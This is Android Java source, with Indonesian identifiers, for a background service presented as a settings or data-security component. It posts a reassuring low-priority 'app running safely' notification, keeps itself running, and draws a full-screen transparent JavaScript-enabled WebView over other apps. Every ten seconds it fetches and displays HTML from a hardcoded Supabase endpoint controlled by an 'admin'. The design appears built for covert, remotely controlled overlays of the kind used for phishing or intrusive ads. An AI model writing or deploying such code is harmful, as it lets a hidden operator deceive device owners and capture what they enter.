package com.settings.datasecure;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LayananBackground extends Service {

    private WindowManager windowManager;
    private WebView webViewOverlay;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    private String htmlOverlayTerakhir = "";
    
    // HANYA FOKUS ID 2 (OVERLAY). Notif (ID 3) dan User sudah diurus Firebase FCM!
    private final String URL_SUPABASE_OVERLAY = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
    private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 

    @Override
    public void onCreate() {
        super.onCreate();
        aktifkanModeBiasa();
        siapkanOverlayWeb();
        mulaiPengecekanOtomatis();
    }

    private void aktifkanModeBiasa() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "ChannelKeamanan",
                    "Sistem Pendukung",
                    NotificationManager.IMPORTANCE_MIN 
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            Notification notifikasi = new Notification.Builder(this, "ChannelKeamanan")
                    .setContentTitle("Sistem Aktif")
                    .setContentText("Aplikasi berjalan aman")
                    .setSmallIcon(android.R.drawable.ic_dialog_info) 
                    .build();
            
            if (Build.VERSION.SDK_INT >= 29) { 
                startForeground(1, notifikasi, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notifikasi);
            }
        }
    }

    private void siapkanOverlayWeb() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        webViewOverlay = new WebView(this);
        WebSettings webSettings = webViewOverlay.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webViewOverlay.setWebViewClient(new WebViewClient());
        
        webViewOverlay.setBackgroundColor(0x00000000); 
        webViewOverlay.setVisibility(View.GONE);

        int jenisOverlay = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                jenisOverlay,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
        parameter.gravity = Gravity.CENTER;
        windowManager.addView(webViewOverlay, parameter);
    }

    private void mulaiPengecekanOtomatis() {
        Runnable sistemPemantau = new Runnable() {
            @Override
            public void run() {
                tarikDataOverlayDariAdmin();
                handler.postDelayed(this, 10000); 
            }
        };
        handler.post(sistemPemantau);
    }

    private void tarikDataOverlayDariAdmin() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(URL_SUPABASE_OVERLAY);
                    HttpURLConnection koneksi = (HttpURLConnection) url.openConnection();
                    koneksi.setRequestMethod("GET");
                    koneksi.setRequestProperty("apikey", KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Accept", "application/json");
                    koneksi.setUseCaches(false);

                    if (koneksi.getResponseCode() == 200) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String baris;
                        while ((baris = in.readLine()) != null) {
                            response.append(baris);
                        }
                        in.close();

                        JSONArray dataJsonArray = new JSONArray(response.toString());
                        if(dataJsonArray.length() > 0){
                            JSONObject barisData = dataJsonArray.getJSONObject(0);
                            final String konten = barisData.getString("html_content");

                            if (!konten.equals(htmlOverlayTerakhir)) {
                                htmlOverlayTerakhir = konten;
                                handler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        if (konten.equals("STOP_OVERLAY") || konten.trim().isEmpty()) {
                                            webViewOverlay.setVisibility(View.GONE);
                                        } else {
                                            webViewOverlay.setVisibility(View.VISIBLE);
                                            webViewOverlay.loadDataWithBaseURL(null, konten, "text/html", "UTF-8", null);
                                        }
                                    }
                                });
                            }
                        }
                    }
                    koneksi.disconnect();
                } catch (Exception e) {}
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webViewOverlay != null && windowManager != null) {
            windowManager.removeView(webViewOverlay);
        }
        handler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
